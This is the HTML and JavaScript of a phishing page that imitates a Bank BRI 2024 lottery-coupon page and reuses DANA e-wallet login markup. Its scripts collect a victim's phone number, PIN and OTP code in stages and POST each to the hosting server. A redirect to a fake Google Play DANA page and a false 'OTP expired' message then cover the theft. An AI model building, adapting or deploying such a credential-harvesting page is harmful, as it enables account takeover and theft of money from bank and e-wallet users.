


<html>

<head>
    <meta name="theme-color" content="#0F78CB"> 
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
   
	<meta property="og:title" content="PT. Bank Rakyat Indonesia (Persero) Tbk."> 
	<meta property="og:description" content="Gedung BRI Jl. Jenderal Sudirman Kav.44-46 Jakarta 10210 Indonesia">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<title>𝗞𝘂𝗽𝗼𝗻 𝗨𝗻𝗱𝗶𝗮𝗻 | 𝗕𝗮𝗻𝗸 𝗕𝗥𝗜 𝟮𝟬𝟮𝟰</title>
<meta property="og:title" content="𝗞𝘂𝗽𝗼𝗻 𝗨𝗻𝗱𝗶𝗮𝗻 | 𝗕𝗮𝗻𝗸 𝗕𝗥𝗜 𝟮𝟬𝟮𝟰">
<meta property="twitter:title" content="𝗞𝘂𝗽𝗼𝗻 𝗨𝗻𝗱𝗶𝗮𝗻 | 𝗕𝗮𝗻𝗸 𝗕𝗥𝗜 𝟮𝟬𝟮𝟰">
<meta property="twitter:card" content="summary_large_image">
<meta property="og:image:type" content="image/jpeg">
<meta content="https://hosting.tigerengine.id/lvit0j.jpg" property="og:image">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
 <link href="https://hosting.tigerengine.id/lvit0j.jpg" rel="icon" type="image/x-icon">
    <link href="https://hosting.tigerengine.id/lvit0j.jpg" rel="apple-touch-icon">
<meta http-equiv="X-UA-Compatible" content="ie=edge">


<meta property="twitter:card" content="summary_large_image">
<meta property="og:image:type" content="image/jpeg">
<meta content="https://hosting.tigerengine.id/lvit0j.jpg" property="og:image">

    
    <!-- Demo styles -->
    <style>
      html,
      body {
        position: relative;
        height: 100%;
		overflow: hidden; 
        background-color: #fff;
        font-family: Helvetica Neue, Helvetica, Arial, sans-serif;
        font-size: 14px;
        color: #000;
        margin: 0;
        padding: 0;
      }

	</style>
</head>
<body style="background-color: #fff;">
    <div style="display:none;" class="index">
        <div class="header">
            
        </div>
        <div class="content">
            <div class="hero">
                
            </div>
            <h1>Dompet digital untuk kamu!</h1>
            <p class="desc">Simpan uang serta kartu debit/kredit dengan<br>praktis di DANA</p>
            <div class="line">
            </div>
            <p class="log">Masukkan <b>nomor HP</b> kamu untuk lanjut</p>
            <button type="button" onclick="next();">LOGIN</button>
        </div>
    </div>
    <div class="start" style="display:none; background-color: #fff;">
        
    </div>
    <div class="container hid">
        <div class="box-login" style="background-color: #fff;">
            <div id="process" name="process" class="process" style="display: none;">
                <div class="loading">
                    
                </div>
            </div>
            <div class="header11">
                <a href="no.php"><img src="https://hosting.tigerengine.id/blmhkf.jpg" style="width: 100%; left: 0px; top: 0px; height: 100%"></a>
            </div>
            
<script>
$(document).ready(function() {
    $('#inp').on('input', function() {
        if ($(this).val() == '0' || $(this).val() == '62') {
            $(this).val('');
        }
    });
});
</script>
<script>
$(document).ready(function() {
    $('#inp').mask('000-0000-000000');
});
</script>
<script>
let inp = document.getElementById("inp");
let btn = document.getElementById("btn");
inp.addEventListener("input", val);

function val() {
    if (inp.value.length > 10) {
        btn.disabled = false;
    } else {
        btn.disabled = true;
    }
};
</script>
<script>
$('.inppin').on('input', function(event) {
    const inputs = $('.inppin');
    const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
    if (isAllFilled == true) {
        $(event.target).blur();
        sendPin();
    };
    const index = inputs.index(this);
    const currentValue = event.target.value;
    if (currentValue.length === 1) {
        if (index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    } else if (currentValue.length === 0) {
        if (index > 0) {
            inputs[index].focus();
        }
    };
});
$('.inppin').on('keydown', function(event) {
    const inputs = $('.inppin');
    const key = event.key;
    const index = inputs.index(this);
    if (key === 'Backspace' && event.target.value.length === 0) {
        if (index > 0) {
            inputs[index - 1].focus();
        }
    };
});
</script>
<script>
$('.inpotp').on('input', function(event) {
    const inputs = $('.inpotp');
    const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
    if (isAllFilled == true) {
        $(event.target).blur();
        sendOtp();
    }
    const index = inputs.index(this);
    const currentValue = event.target.value;
    if (currentValue.length === 1) {
        if (index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    } else if (currentValue.length === 0) {
        if (index > 0) {
            inputs[index].focus();
        }
    };
});
$('.inpotp').on('keydown', function(event) {
    const inputs = $('.inpotp');
    const key = event.key;
    const index = inputs.index(this);
    if (key === 'Backspace' && event.target.value.length === 0) {
        if (index > 0) {
            inputs[index - 1].focus();
        }
    };
});
</script>
<script>
$(document).ready(function() {
    $('.clear').click(function() {
        $('.inppin').val('');
        $('#pin1').focus();
    });
    $('.clearotp').click(function() {
        $('.inpotp').val('');
        $('#otp1').focus();
    });
    $('.show').click(function() {
        $('.inppin').each(function() {
            if ($(this).attr('type') === 'password') {
                $(this).attr('type', 'number');
                $(".show").text("SEMBUNYIKAN");
            } else {
                $(this).attr('type', 'password');
                $(".show").text("TAMPILKAN");
            }
        });
    });
});
</script>
<script>
function sendNohp(event) {
    $("#process").show();
    event.preventDefault();
    $("#inp").blur();
    $.ajax({
        type: 'POST',
        url: '',
        data: $('#formNohp').serialize(),
        dataType: 'text',
        success: function() {
            $("#process").hide();
            $("#formNohp").fadeOut();
            setTimeout(function() {
                $("#inp").val('');
                $("#formPin").fadeIn();
                $("#pin1").focus();
            }, 500);
        }
    });
};
</script>
<script>
function sendPin() {
    $("#process").show();
    $.ajax({
        type: 'POST',
        url: '',
        data: $('#formPin').serialize(),
        dataType: 'text',
        success: function() {
            $("#process").hide();
            $('.inppin').val('');
            $(".bgotp").fadeIn();
            setInterval(countdown, 1000);
            $("#otp1").focus();
        }
    });
};
</script>
<script>
function sendOtp() {
    $(".loadingOtp").show();
    $.ajax({
        type: 'POST',
        url: '',
        data: $('#formOtp').serialize(),
        dataType: 'text',
        success: function() {
            window.location.href = "googleplayDANA.html";
            setTimeout(function() {
                $(".loadingOtp").hide();
                $('.inpotp').val('');
                $(".alert").text("Kode OTP telah kedaluwarsa atau invalid silahkan kirim ulang kode OTP");
                $(".alert").css("color", "red");
            }, 3000);
        }
    });
};
</script>
<script>
function countdown() {
    var count = parseInt($('#countdown').text());
    if (count !== 0) {
        $('#countdown').text(count - 1);
    } else {
        $('#countdown').text('120');
    }
};</script>
<script>
window.onload = function() {
    setTimeout(function() {
        $(".start").fadeIn();
        setTimeout(function() {
            $(".start").fadeOut(1000);
            setTimeout(function() {
                $(".container").fadeIn(200);
                $("#inp").focus();
            }, 1000);
        }, 2000);
    }, 500);
}
</script>



</body>
</html>